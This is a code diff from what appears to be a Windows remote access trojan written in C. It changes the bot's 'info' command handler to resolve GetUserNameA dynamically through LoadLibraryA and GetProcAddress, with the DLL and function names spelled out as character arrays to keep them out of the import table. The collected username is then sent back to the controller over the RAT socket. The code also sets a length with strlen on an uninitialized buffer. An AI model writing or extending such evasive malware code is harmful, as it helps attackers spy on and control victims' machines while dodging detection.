@@ -14,6 +14,7 @@ typedef int WSAAPI _WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
 typedef int _WSACleanup();
 typedef int WSAAPI _WSAGetLastError();
 typedef int WSAAPI _recv(SOCKET s, char *buf, int len, int flags);
+typedef BOOL _GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);
 
 #define SOCKET_BUFFER_SIZE 256
 
@@ -143,16 +144,28 @@ WinMain(HINSTANCE hInstance,
 		char ca_info[] = { 'i','n','f','o',0 };
 		if ( strcmp(recvBuffer, ca_info) == 0 )
 		{
+			char ca_advapi32[256] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };
+			HMODULE libraryAdvapi32 = LoadLibraryA(ca_advapi32);
+			if ( !libraryAdvapi32 )
+			{
+				OutputDebugStringA("Loading libraryAdvapi32 failed.\n");
+				return 1;
+			}
+
+			char ca_GetUsernameA[] = { 'G','e','t','U','s','e','r','N','a','m','e','A',0 };
+			_GetUserNameA* f_GetUserNameA = (_GetUserNameA*)GetProcAddress(libraryAdvapi32, ca_GetUsernameA);
+
 			char buffer[256];
 			DWORD len = strlen(buffer);
-			if ( GetUserNameA(buffer, &len) <= 0 )
+
+			if ( f_GetUserNameA(buffer, &len) <= 0 )
 			{
 				char ca_unknown[] = { 'u','n','k','n','o','w','n', 0 };
 				strncpy(buffer, ca_unknown, sizeof(ca_unknown));
 
-				char buffer[256];
-				sprintf(buffer, "Could not get username: %ld\n", GetLastError());
-				OutputDebugStringA(buffer);
+				char errorBuffer[256];
+				sprintf(errorBuffer, "Could not get username: %ld\n", GetLastError());
+				OutputDebugStringA(errorBuffer);
 			}
 			
 			SocketSend(&ratSocket, buffer);
